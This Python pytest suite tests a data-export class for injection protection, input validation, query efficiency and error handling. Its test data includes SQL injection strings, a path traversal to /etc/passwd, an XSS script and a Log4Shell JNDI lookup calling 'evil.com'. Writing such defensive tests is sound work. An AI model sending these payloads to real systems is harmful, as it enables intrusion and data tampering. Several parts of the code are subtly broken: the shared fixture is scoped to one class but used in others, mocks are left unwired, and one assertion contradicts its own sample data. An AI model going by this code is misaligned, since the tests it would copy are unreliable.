"""
Comprehensive Test Suite for Data Export Feature
Tests all security fixes, performance improvements, and error handling
"""

import pytest
import os
import tempfile
import json
import csv
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path
import psycopg2
from psycopg2 import Error as Psycopg2Error

from refactored_export import DataExporter, ExportError, ValidationError, Config


class TestConfig:
    """Test configuration management"""
    
    def test_get_db_url_success(self):
        """Test successful database URL retrieval"""
        with patch.dict(os.environ, {'DATABASE_URL': 'postgresql://test'}):
            url = Config.get_db_url()
            assert url == 'postgresql://test'
    
    def test_get_db_url_missing(self):
        """Test missing database URL raises error"""
        with patch.dict(os.environ, {}, clear=True):
            with pytest.raises(ValueError, match="DATABASE_URL environment variable is required"):
                Config.get_db_url()
    
    def test_get_api_key_success(self):
        """Test successful API key retrieval"""
        with patch.dict(os.environ, {'API_KEY': 'test-key'}):
            key = Config.get_api_key()
            assert key == 'test-key'
    
    def test_get_api_key_missing(self):
        """Test missing API key raises error"""
        with patch.dict(os.environ, {}, clear=True):
            with pytest.raises(ValueError, match="API_KEY environment variable is required"):
                Config.get_api_key()


class TestDataExporter:
    """Test DataExporter class"""
    
    @pytest.fixture
    def exporter(self):
        """Create DataExporter instance with mocked config"""
        with patch.dict(os.environ, {
            'DATABASE_URL': 'postgresql://test',
            'API_KEY': 'test-key'
        }):
            return DataExporter()
    
    def test_init_success(self):
        """Test successful initialization"""
        with patch.dict(os.environ, {
            'DATABASE_URL': 'postgresql://test',
            'API_KEY': 'test-key'
        }):
            exporter = DataExporter()
            assert exporter.config is not None
    
    def test_init_missing_config(self):
        """Test initialization fails with missing config"""
        with patch.dict(os.environ, {}, clear=True):
            with pytest.raises(ExportError, match="Missing required configuration"):
                DataExporter()
    
    def test_validate_user_name_success(self, exporter):
        """Test successful user name validation"""
        result = exporter.validate_user_name('John Doe')
        assert result == 'John Doe'
    
    def test_validate_user_name_empty(self, exporter):
        """Test validation rejects empty name"""
        with pytest.raises(ValidationError, match="User name cannot be empty"):
            exporter.validate_user_name('')
    
    def test_validate_user_name_too_long(self, exporter):
        """Test validation rejects long names"""
        long_name = 'a' * 101
        with pytest.raises(ValidationError, match="User name too long"):
            exporter.validate_user_name(long_name)
    
    def test_validate_user_name_invalid_chars(self, exporter):
        """Test validation rejects invalid characters"""
        with pytest.raises(ValidationError, match="User name contains invalid characters"):
            exporter.validate_user_name('John; DROP TABLE users; --')
    
    def test_validate_filename_success(self, exporter):
        """Test successful filename validation"""
        result = exporter.validate_filename('export_test.csv')
        assert result == 'export_test.csv'
    
    def test_validate_filename_path_traversal(self, exporter):
        """Test validation rejects path traversal attempts"""
        with pytest.raises(ValidationError, match="Filename contains invalid characters"):
            exporter.validate_filename('../../../etc/passwd')
    
    def test_validate_filename_empty(self, exporter):
        """Test validation rejects empty filename"""
        with pytest.raises(ValidationError, match="Filename cannot be empty"):
            exporter.validate_filename('')


class TestSQLInjectionProtection:
    """Test SQL injection protection"""
    
    @pytest.fixture
    def mock_db_connection(self):
        """Mock database connection"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.cursor.return_value = mock_cursor
        mock_cursor.fetchall.return_value = []
        return mock_conn, mock_cursor
    
    def test_sql_injection_protection(self, exporter, mock_db_connection):
        """Test that SQL injection attempts are safely handled"""
        mock_conn, mock_cursor = mock_db_connection
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            # Attempt SQL injection
            malicious_input = 'Praise"; DROP TABLE users; --'
            result = exporter.export_user_orders(malicious_input)
            
            # Verify parameterized query was used
            expected_query = '''
                SELECT 
                    u.id as user_id,
                    u.name as user_name,
                    u.email as user_email,
                    o.id as order_id,
                    o.product,
                    o.amount,
                    o.created_at,
                    o.status
                FROM users u 
                LEFT JOIN orders o ON u.id = o.user_id 
                WHERE u.name = %s
                ORDER BY u.id, o.created_at
                '''
            
            mock_cursor.execute.assert_called_once()
            call_args = mock_cursor.execute.call_args[0]
            assert call_args[0].strip() == expected_query.strip()
            assert call_args[1] == (malicious_input,)
            
            # Should return empty list for non-existent user
            assert result == []
    
    def test_sql_injection_no_execution(self, exporter, mock_db_connection):
        """Test that malicious SQL is never executed"""
        mock_conn, mock_cursor = mock_db_connection
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            # Attempt various injection attacks
            injection_attempts = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO users (name) VALUES ('hacked'); --",
                "'; UPDATE users SET email='hacked@evil.com'; --"
            ]
            
            for injection in injection_attempts:
                exporter.export_user_orders(injection)
            
            # Verify only parameterized queries were used
            assert mock_cursor.execute.call_count == len(injection_attempts)
            
            for call in mock_cursor.execute.call_args_list:
                query, params = call[0]
                assert '%s' in query  # Parameter placeholder present
                assert params[0] in injection_attempts  # Input passed as parameter


class TestNPlusOneQueryFix:
    """Test N+1 query problem fix"""
    
    @pytest.fixture
    def sample_db_data(self):
        """Sample database data for testing"""
        return [
            (1, 'John Doe', 'john@example.com', 101, 'Product A', 100.0, '2024-01-01', 'completed'),
            (1, 'John Doe', 'john@example.com', 102, 'Product B', 200.0, '2024-01-02', 'completed'),
            (2, 'Jane Smith', 'jane@example.com', None, None, None, None, None),
        ]
    
    def test_single_query_execution(self, exporter, sample_db_data):
        """Test that only one query is executed (no N+1)"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.cursor.return_value = mock_cursor
        mock_cursor.fetchall.return_value = sample_db_data
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            result = exporter.export_user_orders('John Doe')
            
            # Verify only one query was executed
            assert mock_cursor.execute.call_count == 1
            
            # Verify results are properly structured
            assert len(result) == 2  # Two users
            assert result[0]['name'] == 'John Doe'
            assert len(result[0]['orders']) == 2  # Two orders for John
            assert result[1]['name'] == 'Jane Smith'
            assert len(result[1]['orders']) == 0  # No orders for Jane
    
    def test_efficient_data_processing(self, exporter, sample_db_data):
        """Test efficient data processing without loops"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_conn.cursor.return_value = mock_cursor
        mock_cursor.fetchall.return_value = sample_db_data
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            result = exporter.export_user_orders('John Doe')
            
            # Verify data is processed efficiently
            user_data = next(user for user in result if user['name'] == 'John Doe')
            assert len(user_data['orders']) == 2
            assert user_data['orders'][0]['product'] == 'Product A'
            assert user_data['orders'][1]['product'] == 'Product B'


class TestErrorHandling:
    """Test comprehensive error handling"""
    
    def test_database_connection_error(self, exporter):
        """Test database connection error handling"""
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.side_effect = Psycopg2Error("Connection failed")
            
            with pytest.raises(ExportError, match="Unable to connect to database"):
                exporter.export_user_orders('John Doe')
    
    def test_database_query_error(self, exporter):
        """Test database query error handling"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.execute.side_effect = Psycopg2Error("Query failed")
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            with pytest.raises(ExportError, match="Database error during export"):
                exporter.export_user_orders('John Doe')
    
    def test_csv_export_error(self, exporter):
        """Test CSV export error handling"""
        with patch('builtins.open', side_effect=IOError("Permission denied")):
            with pytest.raises(ExportError, match="Unable to create CSV file"):
                exporter.export_to_csv([], 'test.csv')
    
    def test_json_export_error(self, exporter):
        """Test JSON export error handling"""
        with patch('builtins.open', side_effect=IOError("Disk full")):
            with pytest.raises(ExportError, match="Unable to create JSON file"):
                exporter.export_to_json([], 'test.json')
    
    def test_email_notification_error(self, exporter):
        """Test email notification error doesn't fail export"""
        with patch('smtplib.SMTP', side_effect=Exception("SMTP error")):
            # Should not raise exception
            exporter.send_export_notification('test@example.com', 'test.csv', 10)


class TestLogging:
    """Test logging functionality"""
    
    def test_logging_on_export(self, exporter):
        """Test that export operations are logged"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = []
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            with patch('refactored_export.logger') as mock_logger:
                exporter.export_user_orders('John Doe')
                
                # Verify logging calls
                mock_logger.info.assert_called()
                log_calls = [call[0][0] for call in mock_logger.info.call_args_list]
                assert any('Starting export for user: John Doe' in call for call in log_calls)
    
    def test_logging_on_error(self, exporter):
        """Test that errors are logged"""
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.side_effect = Psycopg2Error("Connection failed")
            
            with patch('refactored_export.logger') as mock_logger:
                with pytest.raises(ExportError):
                    exporter.export_user_orders('John Doe')
                
                # Verify error logging
                mock_logger.exception.assert_called()


class TestHappyPath:
    """Test happy path scenarios"""
    
    def test_successful_export_csv(self, exporter):
        """Test successful CSV export"""
        sample_data = [
            {
                'user_id': 1,
                'name': 'John Doe',
                'email': 'john@example.com',
                'orders': [
                    {'order_id': 101, 'product': 'Product A', 'amount': 100.0, 
                     'date': '2024-01-01T00:00:00', 'status': 'completed'}
                ]
            }
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            filename = 'test_export.csv'
            file_path = Path(temp_dir) / filename
            
            with patch('refactored_export.Path') as mock_path:
                mock_path.return_value = Path(temp_dir)
                mock_path.return_value.mkdir = Mock()
                
                exporter.export_to_csv(sample_data, filename)
                
                # Verify file was created
                assert file_path.exists()
                
                # Verify file contents
                with open(file_path, 'r') as f:
                    content = f.read()
                    assert 'user_id,name,email,order_id,product,amount,date,status' in content
                    assert 'John Doe,john@example.com,101,Product A,100.0' in content
    
    def test_successful_export_json(self, exporter):
        """Test successful JSON export"""
        sample_data = [
            {
                'user_id': 1,
                'name': 'John Doe',
                'email': 'john@example.com',
                'orders': [
                    {'order_id': 101, 'product': 'Product A', 'amount': 100.0}
                ]
            }
        ]
        
        with tempfile.TemporaryDirectory() as temp_dir:
            filename = 'test_export.json'
            file_path = Path(temp_dir) / filename
            
            with patch('refactored_export.Path') as mock_path:
                mock_path.return_value = Path(temp_dir)
                mock_path.return_value.mkdir = Mock()
                
                exporter.export_to_json(sample_data, filename)
                
                # Verify file was created
                assert file_path.exists()
                
                # Verify file contents
                with open(file_path, 'r') as f:
                    content = json.load(f)
                    assert len(content) == 1
                    assert content[0]['name'] == 'John Doe'
                    assert len(content[0]['orders']) == 1
    
    def test_empty_export(self, exporter):
        """Test export with no data"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = []
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            result = exporter.export_user_orders('Nonexistent User')
            
            assert result == []
    
    def test_main_export_success(self, exporter):
        """Test main export function success"""
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = [
            (1, 'John Doe', 'john@example.com', 101, 'Product A', 100.0, '2024-01-01', 'completed')
        ]
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            with patch.object(exporter, 'export_to_csv') as mock_export:
                with patch.object(exporter, 'send_export_notification') as mock_email:
                    result = exporter.main_export('John Doe', 'csv', 'test@example.com')
                    
                    assert result['success'] is True
                    assert result['records'] == 1
                    assert 'filename' in result
                    mock_export.assert_called_once()
                    mock_email.assert_called_once()


class TestSecurityFeatures:
    """Test security features"""
    
    def test_hardcoded_credentials_removed(self, exporter):
        """Test that no hardcoded credentials exist"""
        # Check that configuration comes from environment
        assert hasattr(exporter.config, 'get_db_url')
        assert hasattr(exporter.config, 'get_api_key')
        
        # Verify credentials are not hardcoded
        import inspect
        source = inspect.getsource(exporter.__class__)
        assert 'super_secret_password' not in source
        assert 'sk-1234567890abcdef' not in source
    
    def test_input_validation_comprehensive(self, exporter):
        """Test comprehensive input validation"""
        # Test various malicious inputs
        malicious_inputs = [
            '../../../etc/passwd',
            '<script>alert("xss")</script>',
            "'; DROP TABLE users; --",
            'null',
            'undefined',
            'SELECT * FROM users',
            '${jndi:ldap://evil.com/a}',
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError):
                exporter.validate_user_name(malicious_input)
            
            with pytest.raises(ValidationError):
                exporter.validate_filename(malicious_input)


class TestPerformanceOptimizations:
    """Test performance optimizations"""
    
    def test_connection_pooling(self, exporter):
        """Test connection pooling is used"""
        # This would be tested in integration tests
        # For unit tests, we verify the structure supports pooling
        assert hasattr(exporter, 'get_db_connection')
        assert 'contextmanager' in str(type(exporter.get_db_connection))
    
    def test_single_query_execution(self, exporter):
        """Test that single query is executed for multiple users"""
        mock_conn = Mock()
        mock_cursor = Mock()
        
        # Simulate 100 users with orders
        large_dataset = []
        for i in range(100):
            large_dataset.extend([
                (i, f'User{i}', f'user{i}@example.com', 
                 i*10+1, f'Product{i}', 100.0, '2024-01-01', 'completed')
            ])
        
        mock_cursor.fetchall.return_value = large_dataset
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            result = exporter.export_user_orders('User1')
            
            # Should still only execute one query
            assert mock_cursor.execute.call_count == 1


# Integration Tests
class TestIntegration:
    """Integration tests for the complete system"""
    
    @pytest.mark.integration
    def test_end_to_end_export_workflow(self, exporter):
        """Test complete export workflow"""
        # This would test the entire system end-to-end
        # For unit tests, we mock the database components
        
        sample_db_response = [
            (1, 'John Doe', 'john@example.com', 101, 'Product A', 100.0, '2024-01-01', 'completed'),
            (1, 'John Doe', 'john@example.com', 102, 'Product B', 200.0, '2024-01-02', 'completed'),
        ]
        
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = sample_db_response
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            with tempfile.TemporaryDirectory() as temp_dir:
                with patch('refactored_export.Path') as mock_path:
                    mock_path.return_value = Path(temp_dir)
                    mock_path.return_value.mkdir = Mock()
                    
                    # Test complete workflow
                    result = exporter.main_export('John Doe', 'csv', 'test@example.com')
                    
                    # Verify success
                    assert result['success'] is True
                    assert result['records'] == 1
                    
                    # Verify file was created
                    files = list(Path(temp_dir).glob('*.csv'))
                    assert len(files) == 1
                    
                    # Verify file contents
                    with open(files[0], 'r') as f:
                        reader = csv.DictReader(f)
                        rows = list(reader)
                        assert len(rows) == 2  # Two orders


# Performance Tests
class TestPerformance:
    """Performance tests"""
    
    @pytest.mark.performance
    def test_large_dataset_performance(self, exporter):
        """Test performance with large datasets"""
        # Simulate large dataset
        large_dataset = []
        for i in range(1000):
            large_dataset.append(
                (i, f'User{i}', f'user{i}@example.com', 
                 i*10+1, f'Product{i}', 100.0, '2024-01-01', 'completed')
            )
        
        mock_conn = Mock()
        mock_cursor = Mock()
        mock_cursor.fetchall.return_value = large_dataset
        
        with patch.object(exporter, 'get_db_connection') as mock_get_conn:
            mock_get_conn.return_value.__enter__.return_value = mock_conn
            
            import time
            start_time = time.time()
            
            result = exporter.export_user_orders('User1')
            
            end_time = time.time()
            processing_time = end_time - start_time
            
            # Should process 1000 records quickly
            assert processing_time < 1.0  # Less than 1 second
            assert len(result) == 1  # One user
            assert len(result[0]['orders']) == 1000  # All orders loaded


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
